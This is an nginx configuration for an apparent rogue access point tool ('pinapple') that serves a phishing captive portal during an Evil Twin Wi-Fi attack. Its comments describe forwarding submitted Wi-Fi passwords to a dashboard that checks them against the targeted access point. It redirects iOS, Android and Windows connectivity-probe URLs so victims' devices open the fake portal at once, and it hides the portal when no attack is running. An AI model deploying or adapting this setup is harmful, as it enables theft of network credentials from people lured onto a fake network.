server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name _;

    root /opt/pinapple/portal;
    index index.html;

    # Credential submissions are handled by the dashboard: it validates Wi-Fi
    # passwords against the target AP when the Evil Twin is running.
    location = /portal/submit {
        proxy_pass http://127.0.0.1:8080/portal/submit;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    location = /portal/success {
        proxy_pass http://127.0.0.1:5000/portal/success;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    # Captive-network probe endpoints. Returning 302 (instead of the portal
    # page with 200) makes iOS/Android/Windows open the portal on the first
    # probe, without waiting for their "no internet" timeout.
    #   iOS    captive.apple.com/hotspot-detect.html
    #   Android connectivitycheck.gstatic.com/generate_204
    #   Windows www.msftconnecttest.com/connecttest.txt
    location = /hotspot-detect.html { return 302 http://10.0.0.1/; }
    location = /library/test/success.html { return 302 http://10.0.0.1/; }
    location = /generate_204 { return 302 http://10.0.0.1/; }
    location = /gen_204 { return 302 http://10.0.0.1/; }
    location = /connecttest.txt { return 302 http://10.0.0.1/; }
    location = /ncsi.txt { return 302 http://10.0.0.1/; }
    location = /redirect { return 302 http://10.0.0.1/; }

    # A normal AP must not look like a captive portal. When no portal/twin is
    # armed, send the operator to the dashboard instead of the phishing page;
    # while a twin runs, /etc/pinapple/portal-active exists and the portal is
    # served normally below.
    location = / {
        if (!-f /etc/pinapple/portal-active) {
            return 302 http://$host:8080/;
        }
        try_files /index.html =404;
    }

    # Everything else is a captive-portal page.
    location / {
        try_files $uri $uri/ /index.html;
    }
}
